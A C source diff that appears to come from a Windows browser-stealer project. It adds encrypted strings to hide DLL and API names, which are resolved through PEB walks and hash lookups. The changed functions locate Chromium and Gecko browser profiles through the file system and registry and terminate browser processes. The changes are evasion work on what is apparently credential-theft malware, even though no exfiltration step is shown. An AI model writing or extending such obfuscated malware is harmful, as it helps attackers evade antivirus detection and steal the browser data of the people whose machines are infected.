@@ -6,6 +6,7 @@
 #include "hashes.h"
 #include "config.h"
 #include "file_utils.h"
+#include "enc_strings.h"
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -454,19 +455,24 @@ int discover_chromium_browsers_fs(BrowserPath *out, size_t max_out, size_t *coun
     *count = 0;
 
     /* Resolve kernel32 via PEB walk */
-    void *k32 = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
     if (!k32) return -1;
 
     /* Resolve needed functions by hash (no plaintext names in IAT) */
+    char fn[32];
+    enc_decrypt(enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN, fn);
     fn_genvw pGetEnv = (fn_genvw)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindFirstFileW, ENC_FINDFIRSTFILEW_LEN, fn);
     fn_fffw pFF = (fn_fffw)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("FindFirstFileW"));
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileW, ENC_FINDNEXTFILEW_LEN, fn);
     fn_ffnw pFN = (fn_ffnw)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("FindNextFileW"));
+        k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
     fn_fcl  pFC = (fn_fcl)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("FindClose"));
+        k32, mirage_encrypted_hash_func(fn));
     if (!pGetEnv || !pFF || !pFN || !pFC) return -1;
 
     WCHAR base_w[MAX_PATH];
@@ -533,7 +539,8 @@ int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
     if (!out || !count || max_out == 0) return -1;
     *count = 0;
 
-    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
+    char dll_g[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll_g);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_g));
     if (!k32) return -1;
 
     typedef DWORD  (WINAPI *FnGetEnvW)(LPCWSTR, LPWSTR, DWORD);
@@ -729,8 +736,9 @@ int discover_chromium_browsers_registry(BrowserPath *out,
     *count = 0;
 
     /* ── Resolve ntdll exports via PEB walk ──────────────────── */
+    char dll_r[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_r);
     void *ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll"));
+        mirage_encrypted_hash_module(dll_r));
     if (!ntdll) return 0;
 
     typedef NTSTATUS (*pNtOpenKey)(HANDLE *, ULONG, PVOID);
@@ -1006,21 +1014,27 @@ int kill_browser_processes(const char *process_name)
 {
     if (!process_name) return 0;
 
-    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
+    char dll_k[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_k);
+    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_k));
     if (!ntdll) return 0;
 
+    char fn_k[32];
+    enc_decrypt(enc_NtGetNextProcess, ENC_NTGETNEXTPROCESS_LEN, fn_k);
     fnNtGetNextProcess pGetNext =
         (fnNtGetNextProcess)mirage_get_function_by_hash(
-            ntdll, mirage_encrypted_hash_func("NtGetNextProcess"));
+            ntdll, mirage_encrypted_hash_func(fn_k));
+    enc_decrypt(enc_NtTerminateProcess, ENC_NTTERMINATEPROCESS_LEN, fn_k);
     fnNtTerminateProcess pTerm =
         (fnNtTerminateProcess)mirage_get_function_by_hash(
-            ntdll, mirage_encrypted_hash_func("NtTerminateProcess"));
+            ntdll, mirage_encrypted_hash_func(fn_k));
+    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_k);
     fnNtClose pClose =
         (fnNtClose)mirage_get_function_by_hash(
-            ntdll, mirage_encrypted_hash_func("NtClose"));
+            ntdll, mirage_encrypted_hash_func(fn_k));
+    enc_decrypt(enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN, fn_k);
     fnNtQueryInformationProcess pQIP =
         (fnNtQueryInformationProcess)mirage_get_function_by_hash(
-            ntdll, mirage_encrypted_hash_func("NtQueryInformationProcess"));
+            ntdll, mirage_encrypted_hash_func(fn_k));
     if (!pGetNext || !pTerm || !pClose || !pQIP) return 0;
 
     int killed = 0;
